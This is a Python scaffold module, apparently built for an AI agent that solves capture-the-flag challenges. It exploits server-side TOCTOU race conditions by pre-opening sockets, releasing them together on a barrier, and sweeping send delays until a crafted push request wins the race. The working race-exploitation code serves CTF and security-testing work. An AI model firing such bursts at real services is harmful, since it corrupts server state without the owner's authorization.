#!/usr/bin/env python3
"""TOCTOU race scaffold — pre-open + barrier + tight sendall.

Many CTF chals expose a server-side TOCTOU on a non-atomic check+use
sequence (counter increment, freelist link, dup-fd, etc.). On a
single-CPU remote, naively spawning N threads and calling
`requests.get()` inside each one DOES NOT land the race — the
TCP-handshake jitter is in the order of tens of milliseconds while
the race window is often microseconds.

The fix is structural: open every TCP socket BEFORE the race, then
release a barrier and call `sendall()` from each thread within a
single scheduler tick. That collapses the inter-thread spread to
the kernel's own scheduling jitter (~10-100µs on Linux) which is
the right order of magnitude for most server-side races.

Concrete incident 2026-05-25 (job bfce7f3e0c11): main agent's
stage 2 ran TCP `connect()` inside each thread → race lost
240/240 rounds (postjudge diagnosed the same root cause). With
this scaffold's pre-open pattern the same race wins in 1-5 rounds.

Usage
-----

    from scaffold.race_toctou import (
        RaceRequest, race_burst, race_sweep,
    )

    # 1) Define the requests that should fire concurrently.
    reqs = [
        RaceRequest('GET /init/8388607 HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n'),
        RaceRequest('GET /push/0x800100 HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n'),
        RaceRequest('GET /push/0x800101 HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n'),
        # ...
    ]

    # 2) One burst (single race attempt).
    bodies = race_burst(reqs, host, port, recv_bytes=2048)
    # bodies[i] is the raw HTTP response from request i.

    # 3) Sweep many bursts across a range of inter-request delays —
    # races land at different delays depending on remote CPU load.
    def check(bodies):
        return any(b'top=0x800200' in b for b in bodies)

    won_at = race_sweep(
        build_reqs=lambda: reqs,            # called fresh each round
        host=host, port=port,
        success_fn=check,
        delays_us=(0, 50, 200, 1000, 5000, 20000),
        rounds_per_delay=40,
    )
"""
from __future__ import annotations

import socket
import sys
import threading
import time
from dataclasses import dataclass
from typing import Callable, Sequence


@dataclass
class RaceRequest:
    """One pre-rendered HTTP request that ships in a burst.

    `payload` MUST be the full raw bytes — request line + headers +
    `\\r\\n\\r\\n` + body. The scaffold sends it verbatim via
    `sendall()`; nothing is escaped or formatted.

    `recv_bytes` overrides the burst-level recv budget for this one
    socket (useful when one request is expected to return a large
    response while the rest are short). 0 means "use the burst
    default".
    """
    payload: str | bytes
    recv_bytes: int = 0

    def encoded(self) -> bytes:
        if isinstance(self.payload, str):
            return self.payload.encode()
        return self.payload


def _open_one(
    host: str,
    port: int,
    *,
    connect_timeout: float,
) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(connect_timeout)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((host, port))
    return s


def race_burst(
    reqs: Sequence[RaceRequest],
    host: str,
    port: int,
    *,
    recv_bytes: int = 2048,
    connect_timeout: float = 5.0,
    send_timeout: float = 5.0,
    recv_timeout: float = 5.0,
    inter_send_us: int = 0,
) -> list[bytes]:
    """Fire `len(reqs)` concurrent HTTP requests in one tight burst.

    Sockets are opened sequentially BEFORE the barrier is released,
    so TCP-handshake jitter cannot bleed into the race window. Each
    worker thread blocks on the barrier, then calls `sendall()`,
    then `recv()`s up to its budget.

    `inter_send_us` introduces a deliberate per-thread offset right
    after the barrier (0 = simultaneous, otherwise thread i sleeps
    `i * inter_send_us` µs). Sweeping this lets `race_sweep` find
    the timing where the TOCTOU window opens.

    Returns the per-request response bodies in `reqs` order. A
    socket that raises during send/recv returns b'' at its index —
    the caller can treat that as "didn't get a response" without
    crashing the burst.
    """
    n = len(reqs)
    if n == 0:
        return []

    socks: list[socket.socket] = []
    try:
        for _ in range(n):
            socks.append(_open_one(host, port, connect_timeout=connect_timeout))

        barrier = threading.Barrier(n + 1)  # +1 = main thread releases
        bodies: list[bytes] = [b""] * n
        errors: list[BaseException | None] = [None] * n

        def worker(idx: int) -> None:
            s = socks[idx]
            req = reqs[idx]
            try:
                barrier.wait(timeout=connect_timeout + 2)
                if inter_send_us and idx:
                    time.sleep((idx * inter_send_us) / 1_000_000.0)
                s.settimeout(send_timeout)
                s.sendall(req.encoded())
                s.settimeout(recv_timeout)
                budget = req.recv_bytes or recv_bytes
                chunks: list[bytes] = []
                received = 0
                while received < budget:
                    try:
                        data = s.recv(min(4096, budget - received))
                    except (socket.timeout, TimeoutError):
                        break
                    if not data:
                        break
                    chunks.append(data)
                    received += len(data)
                bodies[idx] = b"".join(chunks)
            except BaseException as e:
                errors[idx] = e

        threads = [
            threading.Thread(target=worker, args=(i,), daemon=True)
            for i in range(n)
        ]
        for t in threads:
            t.start()
        barrier.wait(timeout=connect_timeout + 2)
        for t in threads:
            t.join(timeout=connect_timeout + recv_timeout + 5)
        return bodies
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass


def race_sweep(
    *,
    build_reqs: Callable[[], Sequence[RaceRequest]],
    host: str,
    port: int,
    success_fn: Callable[[list[bytes]], bool],
    delays_us: Sequence[int] = (0, 50, 200, 1000, 5000, 20000, 100000),
    rounds_per_delay: int = 20,
    recv_bytes: int = 2048,
    log: Callable[[str], None] | None = None,
    on_round: Callable[[int, int, list[bytes]], None] | None = None,
) -> tuple[int, int, list[bytes]] | None:
    """Sweep `inter_send_us` × rounds until `success_fn(bodies)` is True.

    `build_reqs()` is called fresh each round so the caller can
    re-derive request payloads from the current target state
    (e.g. re-`/init`-set top, then push new attacker-chosen values).

    Returns (delay_us, round_index, bodies) on success, or None
    after exhausting the full sweep. `on_round` (if given) is
    called with (delay_us, round_index, bodies) regardless of
    success — useful for logging count progression between
    rounds.
    """
    log = log or (lambda s: sys.stderr.write(s + "\n"))
    total = len(delays_us) * rounds_per_delay
    seen = 0
    for d in delays_us:
        for r in range(rounds_per_delay):
            seen += 1
            try:
                reqs = build_reqs()
                bodies = race_burst(
                    reqs, host, port,
                    recv_bytes=recv_bytes,
                    inter_send_us=d,
                )
            except OSError as e:
                log(f"[race-sweep] {seen}/{total} delay={d}µs OSError {e}")
                continue
            if on_round:
                try:
                    on_round(d, r, bodies)
                except Exception:
                    pass
            if success_fn(bodies):
                log(f"[race-sweep] WON at delay={d}µs round={r+1} "
                    f"(attempt {seen}/{total})")
                return (d, r, bodies)
    log(f"[race-sweep] no win after {total} attempts "
        f"across delays={list(delays_us)}")
    return None


def build_get(path: str, host: str = "x") -> RaceRequest:
    """Convenience: build a minimal HTTP/1.0 GET request.

    Uses `Connection: close` so the server hangs up after responding
    — keeps `recv()` deterministic across both Werkzeug and gunicorn.
    """
    raw = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"User-Agent: race-toctou-scaffold\r\n"
        f"\r\n"
    )
    return RaceRequest(raw)
